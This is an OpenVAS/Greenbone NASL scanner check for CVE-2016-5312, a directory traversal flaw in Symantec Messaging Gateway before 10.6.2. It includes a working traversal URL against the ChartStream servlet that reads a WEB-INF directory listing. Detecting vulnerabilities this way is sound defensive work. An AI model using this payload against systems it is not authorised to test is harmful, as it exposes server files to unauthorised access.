# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:symantec:messaging_gateway";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807891");
  script_version("2023-07-20T05:05:17+0000");
  script_cve_id("CVE-2016-5312");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-20 05:05:17 +0000 (Thu, 20 Jul 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-04-22 14:16:00 +0000 (Sat, 22 Apr 2017)");
  script_tag(name:"creation_date", value:"2016-09-30 10:38:42 +0530 (Fri, 30 Sep 2016)");

  script_name("Symantec Messaging Gateway Directory Traversal Vulnerability (SYM16-016)");

  script_tag(name:"summary", value:"Symantec Messaging Gateway is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request
  and check whether it is able to read files.");

  script_tag(name:"insight", value:"The flaw exists due to error in the charting
  component in the Symantec Messaging Gateway which does not properly sanitize user
  input submitted for charting requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to
  access to some files/directories on the server for which the user is not authorized.");

  script_tag(name:"affected", value:"Symantec Messaging Gateway prior to 10.6.2");

  script_tag(name:"solution", value:"Upgrade to Symantec Messaging Gateway 10.6.2
  or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&amp;pvid=security_advisory&amp;year=&amp;suid=20160927_00");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/93148");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_symantec_messaging_gateway_detect.nasl");
  script_mandatory_keys("symantec_smg/detected");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!sgPort = get_app_port(cpe: CPE, service: "www"))
  exit(0);

url = "/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/lib";

if(http_vuln_check(port:sgPort, url:url,  pattern:"sun-mail",
                   extra_check:make_list("rngpack", "apache-mime", "vontu-detection"), check_header:TRUE))
{
  report = http_report_vuln_url(port:sgPort, url:url);
  security_message(port:sgPort, data:report);
  exit(0);
}

exit(99);
